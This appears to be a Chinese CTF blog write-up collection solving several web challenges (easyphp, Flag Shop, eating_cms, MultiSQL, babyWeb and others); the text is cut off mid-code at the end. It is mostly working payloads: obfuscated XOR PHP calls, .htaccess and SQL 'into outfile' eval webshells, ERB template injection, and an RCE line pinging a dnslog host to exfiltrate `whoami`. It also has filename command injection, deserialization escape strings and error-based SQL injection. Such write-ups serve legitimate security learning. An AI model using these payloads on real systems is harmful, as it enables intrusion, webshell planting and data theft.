8 9 10 11 12 target = \u0026#34;phpinfo\u0026#34; standard = 0xff dicts = {} for i in target: dicts[i] = hex(ord(i)^standard).replace(\u0026#39;0x\u0026#39;,\u0026#39;%\u0026#39;) res = \u0026#39;\u0026#39; for i in target: res = res+dicts[i] print(res+\u0026#39;^\u0026#39;+\u0026#34;%ff\u0026#34;*len(target)) print(len(set(res+\u0026#39;^\u0026#39;+\u0026#34;%ff\u0026#34;*len(target)))) 1 2 print_r(scandir(\u0026#39;.\u0026#39;)) (%8f%8d%96%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff)((%8c%9c%9e%91%9b%96%8d^%ff%ff%ff%ff%ff%ff%ff)((%d1^%ff))); 要找到可以替换的，即在内部可以互相异或出来的，才能使重复的变少\n最后\n1 2 print_r(scandir(\u0026#39;.\u0026#39;)) (%8f%8d%9c%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff^%ff%ff%9b%ff%ff%ff%ff^%ff%ff%91%ff%ff%ff%ff)((%9c%9c%8d%91%9b%9c%8d^%ff%ff%ff%ff%ff%ff%ff^%9b%ff%9c%ff%ff%9b%ff^%8b%ff%8f%ff%ff%91%ff)((%d1^%ff))); 1 2 readfile(end(scandir(\u0026#39;.\u0026#39;))) ((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF))); [羊城杯2020]easyphp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php $files = scandir(\u0026#39;./\u0026#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== \u0026#34;index.php\u0026#34;) { unlink($file); } } } if(!isset($_GET[\u0026#39;content\u0026#39;]) || !isset($_GET[\u0026#39;filename\u0026#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[\u0026#39;content\u0026#39;]; if(stristr($content,\u0026#39;on\u0026#39;) || stristr($content,\u0026#39;html\u0026#39;) || stristr($content,\u0026#39;type\u0026#39;) || stristr($content,\u0026#39;flag\u0026#39;) || stristr($content,\u0026#39;upload\u0026#39;) || stristr($content,\u0026#39;file\u0026#39;)) { echo \u0026#34;Hacker\u0026#34;; die(); } $filename = $_GET[\u0026#39;filename\u0026#39;]; if(preg_match(\u0026#34;/[^a-z\\.]/\u0026#34;, $filename) == 1) { echo \u0026#34;Hacker\u0026#34;; die(); } $files = scandir(\u0026#39;./\u0026#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== \u0026#34;index.php\u0026#34;) { unlink($file); } } } file_put_contents($filename, $content . \u0026#34;\\nHello, world\u0026#34;); ?\u0026gt; 这里利用到之前学习hatccess文件的作用，包含index.php,反斜杠绕过正则\n1 2 3 php_value auto_prepend_fi\\ le .htaccess #\u0026lt;?php system(\u0026#39;ls /\u0026#39;);?\u0026gt;\\ 换行用url编码一下\n1 ?filename=.htaccess\u0026amp;content=php_value%20auto_prepend_fi\\%0Ale%20.htaccess%0A%23%3C?php%20system(\u0026#39;ls%20/\u0026#39;);?%3E\\ 或者利用上次学到的.htaccess文件绕过prce限制的方法写马\n1 2 3 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 # \\ 1 ?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\\\u0026amp;f ilename=.htaccess 1 ?filename=php://filter/write=convert.base64-decode/resource=.htaccess\u0026amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw\u0026amp;1=phpinfo(); [FireshellCTF2020]Caas c语言编译报错\n利用#include来文件包含\n1 #include \u0026#34;/etc/passwd\u0026#34; 直接包含flag\n1 #include \u0026#34;/flag\u0026#34; [HarekazeCTF2019]Avatar Uploader 1 原题给了源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 \u0026lt;?php error_reporting(0); require_once(\u0026#39;config.php\u0026#39;); require_once(\u0026#39;lib/util.php\u0026#39;); require_once(\u0026#39;lib/session.php\u0026#39;); $session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY); // check whether file is uploaded if (!file_exists($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]) || !is_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { error(\u0026#39;No file was uploaded.\u0026#39;); } // check file size if ($_FILES[\u0026#39;file\u0026#39;][\u0026#39;size\u0026#39;] \u0026gt; 256000) { error(\u0026#39;Uploaded file is too large.\u0026#39;); } // check file type $finfo = finfo_open(FILEINFO_MIME_TYPE); $type = finfo_file($finfo, $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); finfo_close($finfo); if (!in_array($type, [\u0026#39;image/png\u0026#39;])) { error(\u0026#39;Uploaded file is not PNG format.\u0026#39;); } // check file width/height $size = getimagesize($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if ($size[0] \u0026gt; 256 || $size[1] \u0026gt; 256) { error(\u0026#39;Uploaded image is too large.\u0026#39;); } if ($size[2] !== IMAGETYPE_PNG) { // I hope this never happens... error(\u0026#39;What happened...? OK, the flag for part 1 is: \u0026lt;code\u0026gt;\u0026#39; . getenv(\u0026#39;FLAG1\u0026#39;) . \u0026#39;\u0026lt;/code\u0026gt;\u0026#39;); } // ok $filename = bin2hex(random_bytes(4)) . \u0026#39;.png\u0026#39;; move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_DIR . \u0026#39;/\u0026#39; . $filename); $session-\u0026gt;set(\u0026#39;avatar\u0026#39;, $filename); flash(\u0026#39;info\u0026#39;, \u0026#39;Your avatar has been successfully updated!\u0026#39;); redirect(\u0026#39;/\u0026#39;); 这里用到finfo_file检测图片类型，然后getimagesize判断文件像素大小，并且再进行一次类型判断，如果不是 png 类型就给出 flag，我们直接010构造一个只有png头的图片,去misc题里面找一个png图片，把文件头下面全删了\n[SCTF2019]Flag Shop 目录扫描robots.txt\n源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 require \u0026#39;sinatra\u0026#39; require \u0026#39;sinatra/cookies\u0026#39; require \u0026#39;sinatra/json\u0026#39; require \u0026#39;jwt\u0026#39; require \u0026#39;securerandom\u0026#39; require \u0026#39;erb\u0026#39; set :public_folder, File.dirname(__FILE__) + \u0026#39;/static\u0026#39; FLAGPRICE = 1000000000000000000000000000 ENV[\u0026#34;SECRET\u0026#34;] = SecureRandom.hex(64) configure do enable :logging file = File.new(File.dirname(__FILE__) + \u0026#39;/../log/http.log\u0026#39;,\u0026#34;a+\u0026#34;) file.sync = true use Rack::CommonLogger, file end get \u0026#34;/\u0026#34; do redirect \u0026#39;/shop\u0026#39;, 302 end get \u0026#34;/filebak\u0026#34; do content_type :text erb IO.binread __FILE__ end get \u0026#34;/api/auth\u0026#34; do payload = { uid: SecureRandom.uuid , jkl: 20} auth = JWT.encode payload,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth end get \u0026#34;/api/info\u0026#34; do islogin auth = JWT.decode cookies[:auth],ENV[\u0026#34;SECRET\u0026#34;] , true, { algorithm: \u0026#39;HS256\u0026#39; } json({uid: auth[0][\u0026#34;uid\u0026#34;],jkl: auth[0][\u0026#34;jkl\u0026#34;]}) end get \u0026#34;/shop\u0026#34; do erb :shop end get \u0026#34;/work\u0026#34; do islogin auth = JWT.decode cookies[:auth],ENV[\u0026#34;SECRET\u0026#34;] , true, { algorithm: \u0026#39;HS256\u0026#39; } auth = auth[0] unless params[:SECRET].nil? if ENV[\u0026#34;SECRET\u0026#34;].match(\u0026#34;#{params[:SECRET].match(/[0-9a-z]+/)}\u0026#34;) puts ENV[\u0026#34;FLAG\u0026#34;] end end if params[:do] == \u0026#34;#{params[:name][0,7]} is working\u0026#34; then auth[\u0026#34;jkl\u0026#34;] = auth[\u0026#34;jkl\u0026#34;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth ERB::new(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;#{params[:name][0,7]} working successfully!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;).result end end post \u0026#34;/shop\u0026#34; do islogin auth = JWT.decode cookies[:auth],ENV[\u0026#34;SECRET\u0026#34;] , true, { algorithm: \u0026#39;HS256\u0026#39; } if auth[0][\u0026#34;jkl\u0026#34;] \u0026lt; FLAGPRICE then json({title: \u0026#34;error\u0026#34;,message: \u0026#34;no enough jkl\u0026#34;}) else auth \u0026lt;\u0026lt; {flag: ENV[\u0026#34;FLAG\u0026#34;]} auth = JWT.encode auth,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth json({title: \u0026#34;success\u0026#34;,message: \u0026#34;jkl is good thing\u0026#34;}) end end def islogin if cookies[:auth].nil? then redirect to(\u0026#39;/shop\u0026#39;) end end ERB模板注入\n注入点\n1 2 3 4 5 6 if params[:do] == \u0026#34;#{params[:name][0,7]} is working\u0026#34; then auth[\u0026#34;jkl\u0026#34;] = auth[\u0026#34;jkl\u0026#34;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth ERB::new(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;#{params[:name][0,7]} working successfully!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;).result do和name要相同，有长度限制7字符，除去\u0026lt;%=%\u0026gt;只剩下两个字符，利用ruby的预定义变量$',可以匹配最后一次匹配右边的内容\n1 2 3 4 unless params[:SECRET].nil? if ENV[\u0026#34;SECRET\u0026#34;].match(\u0026#34;#{params[:SECRET].match(/[0-9a-z]+/)}\u0026#34;) puts ENV[\u0026#34;FLAG\u0026#34;] end 这里还有正则匹配，需要有SECRET参数且为false,$'就能获取secret\n1 2 \u0026lt;%=$\u0026#39;%\u0026gt; url编码一下：%3C%25%3D%24%27%25%3E 甚至可以不传SECRET参数\n1 /work?name=%3C%25%3D%24%27%25%3E\u0026amp;do=%3C%25%3D%24%27%25%3E%20is%20working 获取到secret值\n拿着key伪造\n/shop路由改cookie\n这里看到有rce的做法\n1 2 3 4 $a = \u0026#34;mon123\u0026#34; $b = Array[\u0026#34;aaa\u0026#34;,\u0026#34;bbb\u0026#34;,\u0026#34;ccc\u0026#34;] puts \u0026#34;$a: #{$a[0,3]}\u0026#34;//mon puts \u0026#34;$b: #{$b[0,3]}\u0026#34;//[\u0026#34;aaa\u0026#34;,\u0026#34;bbb\u0026#34;,\u0026#34;ccc\u0026#34;] 这里，$b原本是数组，但是因为被拼接到了字符串中，所以数组默认的类型变成了[\u0026quot;aaa\u0026quot;, \u0026quot;bbb\u0026quot;, \u0026quot;ccc\u0026quot;],这样上面代码的限制，从原本的7个字符，变成了7个数组长度\n1 /work?name[]=\u0026lt;%=system(\u0026#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn\u0026#39;)%\u0026gt;\u0026amp;name[]=1\u0026amp;name[]=2\u0026amp;name[]=3\u0026amp;name[]=4\u0026amp;name[]=5\u0026amp;name[]=6\u0026amp;do=[\u0026#34;\u0026lt;%=system(\u0026#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn\u0026#39;)%\u0026gt;\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;6\u0026#34;] is working [N1CTF 2018]eating_cms 先进register.php注册后登入\nurl可以任意文件读取\n伪协议读一下\n1 user.php?page=php://filter/convert.base64-encode/resource=index function.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 \u0026lt;?php session_start(); require_once \u0026#34;config.php\u0026#34;; function Hacker() { Header(\u0026#34;Location: hacker.php\u0026#34;); die(); } function filter_directory() { $keywords = [\u0026#34;flag\u0026#34;,\u0026#34;manage\u0026#34;,\u0026#34;ffffllllaaaaggg\u0026#34;]; $uri = parse_url($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]); parse_str($uri[\u0026#39;query\u0026#39;], $query); // var_dump($query); // die(); foreach($keywords as $token) { foreach($query as $k =\u0026gt; $v) { if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); } } } function filter_directory_guest() { $keywords = [\u0026#34;flag\u0026#34;,\u0026#34;manage\u0026#34;,\u0026#34;ffffllllaaaaggg\u0026#34;,\u0026#34;info\u0026#34;]; $uri = parse_url($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]); parse_str($uri[\u0026#39;query\u0026#39;], $query); // var_dump($query); // die(); foreach($keywords as $token) { foreach($query as $k =\u0026gt; $v) { if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); } } } function Filter($string) { global $mysqli; $blacklist = \u0026#34;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\u0026#34;; $whitelist = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;(),_*`-@=+\u0026gt;\u0026lt;\u0026#34;; for ($i = 0; $i \u0026lt; strlen($string); $i++) { if (strpos(\u0026#34;$whitelist\u0026#34;, $string[$i]) === false) { Hacker(); } } if (preg_match(\u0026#34;/$blacklist/is\u0026#34;, $string)) { Hacker(); } if (is_string($string)) { return $mysqli-\u0026gt;real_escape_string($string); } else { return \u0026#34;\u0026#34;; } } function sql_query($sql_query) { global $mysqli; $res = $mysqli-\u0026gt;query($sql_query); return $res; } function login($user, $pass) { $user = Filter($user); $pass = md5($pass); $sql = \u0026#34;select * from `albert_users` where `username_which_you_do_not_know`= \u0026#39;$user\u0026#39; and `password_which_you_do_not_know_too` = \u0026#39;$pass\u0026#39;\u0026#34;; echo $sql; $res = sql_query($sql); // var_dump($res); // die(); if ($res-\u0026gt;num_rows) { $data = $res-\u0026gt;fetch_array(); $_SESSION[\u0026#39;user\u0026#39;] = $data[username_which_you_do_not_know]; $_SESSION[\u0026#39;login\u0026#39;] = 1; $_SESSION[\u0026#39;isadmin\u0026#39;] = $data[isadmin_which_you_do_not_know_too_too]; return true; } else { return false; } return; } function updateadmin($level,$user) { $sql = \u0026#34;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = \u0026#39;$level\u0026#39; where `username_which_you_do_not_know`=\u0026#39;$user\u0026#39; \u0026#34;; echo $sql; $res = sql_query($sql); // var_dump($res); // die(); // die($res); if ($res == 1) { return true; } else { return false; } return; } function register($user, $pass) { global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = \u0026#34;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (\u0026#39;$user\u0026#39;,\u0026#39;$pass\u0026#39;,\u0026#39;0\u0026#39;)\u0026#34;; $res = sql_query($sql); return $mysqli-\u0026gt;insert_id; } function logout() { session_destroy(); Header(\u0026#34;Location: index.php\u0026#34;); } ?\u0026gt; 1 2 3 $keywords = [\u0026#34;flag\u0026#34;,\u0026#34;manage\u0026#34;,\u0026#34;ffffllllaaaaggg\u0026#34;,\u0026#34;info\u0026#34;]; $uri = parse_url($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]); parse_str($uri[\u0026#39;query\u0026#39;], $query); 这里用到parse_url的解析漏洞，在/user.php前面加斜杠，就会被当成host解析，返回false绕过黑名单\n1 //user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg 1 2 3 4 5 6 7 \u0026lt;?php if (FLAG_SIG != 1){ die(\u0026#34;you can not visit it directly\u0026#34;); }else { echo \u0026#34;you can find sth in m4aaannngggeee\u0026#34;; } ?\u0026gt; 提示templates/upload.html\n发现upllloadddd.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php $allowtype = array(\u0026#34;gif\u0026#34;,\u0026#34;png\u0026#34;,\u0026#34;jpg\u0026#34;); $size = 10000000; $path = \u0026#34;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\u0026#34;; $filename = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; if(is_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;])){ if(!move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;],$path.$filename)){ die(\u0026#34;error:can not move\u0026#34;); } }else{ die(\u0026#34;error:not an upload file！\u0026#34;); } $newfile = $path.$filename; echo \u0026#34;file upload success\u0026lt;br /\u0026gt;\u0026#34;; echo $filename; $picdata = system(\u0026#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\u0026#34;.$filename.\u0026#34; | base64 -w 0\u0026#34;); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/png;base64,\u0026#34;.$picdata.\u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; if($_FILES[\u0026#39;file\u0026#39;][\u0026#39;error\u0026#39;]\u0026gt;0){ unlink($newfile); die(\u0026#34;Upload file error: \u0026#34;); } $ext = array_pop(explode(\u0026#34;.\u0026#34;,$_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;])); if(!in_array($ext,$allowtype)){ unlink($newfile); } ?\u0026gt; 1 $picdata = system(\u0026#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\u0026#34;.$filename.\u0026#34; | base64 -w 0\u0026#34;); 这里可以用;拼接命令来执行\n找到前面能上传的地方\n斜杠被过滤了，cd ..回上级目录，其实加个#就不用base64解码了\n[GYCTF2020]Easyphp www.zip下载源码\n1 2 3 4 function safe($parm){ $array= array(\u0026#39;union\u0026#39;,\u0026#39;regexp\u0026#39;,\u0026#39;load\u0026#39;,\u0026#39;into\u0026#39;,\u0026#39;flag\u0026#39;,\u0026#39;file\u0026#39;,\u0026#39;insert\u0026#39;,\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\\\\\u0026#39;,\u0026#34;*\u0026#34;,\u0026#34;alter\u0026#34;); return str_replace($array,\u0026#39;hacker\u0026#39;,$parm); } 反序列化字符串逃逸\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php class User{ public $age=null; public $nickname=null; public function __construct(){ $this-\u0026gt;age = \u0026#39;select 1,\u0026#34;c4ca4238a0b923820dcc509a6f75849b\u0026#34; from user where username=?\u0026#39;; $this-\u0026gt;nickname = new Info(); } } class Info{ public $CtrlCase; public function __construct(){ $this-\u0026gt;CtrlCase = new dbCtrl(); } } Class UpdateHelper{ public $sql; public function __construct() { $this-\u0026gt;sql = new User(); } } class dbCtrl{ public $name = \u0026#34;admin\u0026#34;; public $password = \u0026#34;1\u0026#34;; } $o = new UpdateHelper; echo serialize($o); 得到\n1 O:12:\u0026#34;UpdateHelper\u0026#34;:1:{s:3:\u0026#34;sql\u0026#34;;O:4:\u0026#34;User\u0026#34;:2:{s:3:\u0026#34;age\u0026#34;;s:70:\u0026#34;select 1,\u0026#34;c4ca4238a0b923820dcc509a6f75849b\u0026#34; from user where username=?\u0026#34;;s:8:\u0026#34;nickname\u0026#34;;O:4:\u0026#34;Info\u0026#34;:1:{s:8:\u0026#34;CtrlCase\u0026#34;;O:6:\u0026#34;dbCtrl\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:1:\u0026#34;1\u0026#34;;}}}} 反序列化点在这里\n1 2 3 4 5 6 7 8 9 10 11 12 public function update(){ $Info=unserialize($this-\u0026gt;getNewinfo()); $age=$Info-\u0026gt;age; $nickname=$Info-\u0026gt;nickname; $updateAction=new UpdateHelper($_SESSION[\u0026#39;id\u0026#39;],$Info,\u0026#34;update user SET age=$age,nickname=$nickname where id=\u0026#34;.$_SESSION[\u0026#39;id\u0026#39;]); //这个功能还没有写完 先占坑 } public function getNewInfo(){ $age=$_POST[\u0026#39;age\u0026#39;]; $nickname=$_POST[\u0026#39;nickname\u0026#39;]; return safe(serialize(new Info($age,$nickname))); } update.php里面post传age和nickname\n1 age=1\u0026amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion\u0026#34;;s:8:\u0026#34;CtrlCase\u0026#34;;O:12:\u0026#34;UpdateHelper\u0026#34;:1:{s:3:\u0026#34;sql\u0026#34;;O:4:\u0026#34;User\u0026#34;:2:{s:3:\u0026#34;age\u0026#34;;s:70:\u0026#34;select 1,\u0026#34;c4ca4238a0b923820dcc509a6f75849b\u0026#34; from user where username=?\u0026#34;;s:8:\u0026#34;nickname\u0026#34;;O:4:\u0026#34;Info\u0026#34;:1:{s:8:\u0026#34;CtrlCase\u0026#34;;O:6:\u0026#34;dbCtrl\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:1:\u0026#34;1\u0026#34;;}}}}} 然后用admin登入\n[SUCTF 2018]MultiSQL 这里利用sql的预处理语句\nset 的作用就是定义一个变量，变量的命名必须是@开头。\nprepare和execute prepare语句用于预定义一个语句，并可以指定预定义语句名称。execute则是执行预定义语句。\n1 select ‘\u0026lt;?php eval($_POST[_]);?\u0026gt;’ into outfile ‘/var/www/html/favicon/shell.php’; 利用char绕过waf\n先转进制\n1 2 3 4 5 6 7 8 str=\u0026#34;select \u0026#39;\u0026lt;?php eval($_POST[_]);?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/favicon/shell.php\u0026#39;;\u0026#34; len_str=len(str) for i in range(0,len_str): if i == 0: print(\u0026#39;char(%s\u0026#39;%ord(str[i]),end=\u0026#34;\u0026#34;) else: print(\u0026#39;,%s\u0026#39;%ord(str[i]),end=\u0026#34;\u0026#34;) print(\u0026#39;)\u0026#39;) 1 char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59) payload\n1 ?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query; 然后访问/favicon/shell.php\n[SUCTF 2018]annonymous 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $MY = create_function(\u0026#34;\u0026#34;,\u0026#34;die(`cat flag.php`);\u0026#34;); $hash = bin2hex(openssl_random_pseudo_bytes(32)); eval(\u0026#34;function SUCTF_$hash(){\u0026#34; .\u0026#34;global \\$MY;\u0026#34; .\u0026#34;\\$MY();\u0026#34; .\u0026#34;}\u0026#34;); if(isset($_GET[\u0026#39;func_name\u0026#39;])){ $_GET[\u0026#34;func_name\u0026#34;](); die(); } show_source(__FILE__); hash随机生成数字拼接到下面函数中，这个随机没办法，但是create_function函数有个漏洞，上次搞[HITCON 2017]Baby^h Master PHP的时候遇到了\n会生成匿名函数\\0lambda_%d\n通过大量的请求来迫使Pre-fork模式启动\n1 2 3 4 5 6 7 import requests while True: r=requests.get(\u0026#39;http://a10002f2-2091-47dc-9b7c-996d05cd4faa.node3.buuoj.cn/?func_name=%00lambda_1\u0026#39;) if \u0026#39;flag\u0026#39; in r.text: print(r.text) break print(\u0026#39;[-]\u0026#39;) [RootersCTF2019]babyWeb 报错注入，过滤or用||绕过\n过滤单双引号用16进制绕过\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 search=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23 //sql_injection search=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x73716C5F696E6A656374696F6E),0x7e),1)%23 //users search=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),0x7e),1)%23 search=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),0x7e),1)%23 //USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,user,uniqueid search=1 and updatexml(1,concat(0x7e,(select count(uniqueid) from users),0x7e),1)%23 //2 search=1 and updatexml(1,concat(0x7e,(select group_concat(uniqueid) from users),0x7e),1)%23 //837461526918364526,123456789928466788 或者用万能密码\n1 1 || 1=1 limit 0,1 [安洵杯 2019]不是文件上传 先用源码的反序列化\n1 2 3 4 5 6 7 8 \u0026lt;?php class helper { protected $ifview = True; protected $config = \u0026#34;/flag\u0026#34;; } $a = new helper(); echo serialize($a); ?\u0026gt; 1 O:6:\u0026#34;helper\u0026#34;:2:{s:9:\u0026#34;*ifview\u0026#34;;b:1;s:9:\u0026#34;*config\u0026#34;;s:5:\u0026#34;/flag\u0026#34;;} 因为都是protected属性的，用\\0\\0\\0替换（源码给的\n1 2 3 foreach($data as $key=\u0026gt;$value){ $key_temp = str_replace(chr(0).\u0026#39;*\u0026#39;.chr(0), \u0026#39;\\0\\0\\0\u0026#39;, $key); $value_temp = str_replace(chr(0).\u0026#39;*\u0026#39;.chr(0), \u0026#39;\\0\\0\\0\u0026#39;, $value); 1 O:6:\u0026#34;helper\u0026#34;:2:{s:9:\u0026#34;\\0\\0\\0ifview\u0026#34;;b:1;s:9:\u0026#34;\\0\\0\\0config\u0026#34;;s:5:\u0026#34;/flag\u0026#34;;} 然后源码有这一行\n1 $sql = \u0026#34;INSERT INTO images (\u0026#34;.(implode(\u0026#34;,\u0026#34;,$sql_fields)).\u0026#34;) VALUES(\u0026#34;.(implode(\u0026#34;,\u0026#34;,$sql_val)).\u0026#34;)\u0026#34;; 看返回值titile可控\n拼接然后16进制绕过双引号waf\n1 1\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;1\u0026#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(\u0026#39;1.jpg 然后修改文件名\n访问show.php触发反序列化\n[强网杯 2019]Upload 目录扫描www.tar.gz\nthinkphp5\nprofile.php下面有两个魔术方法\n1 2 3 4 5 6 7 8 9 10 11 public function __get($name) { return $this-\u0026gt;except[$name]; } public function __call($name, $arguments) { if($this-\u0026gt;{$name}){ $this-\u0026gt;{$this-\u0026gt;{$name}}($arguments); } } register.php里面也有\n1 2 3 4 5 6 public function __destruct() { if(!$this-\u0026gt;registed){ $this-\u0026gt;checker-\u0026gt;index(); } } 1 Profile赋值checker，触发call，然后agrument为空,触发get，然后except可控 然后回来看上传的逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 if(!empty($_FILES)){ $this-\u0026gt;filename_tmp=$_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; 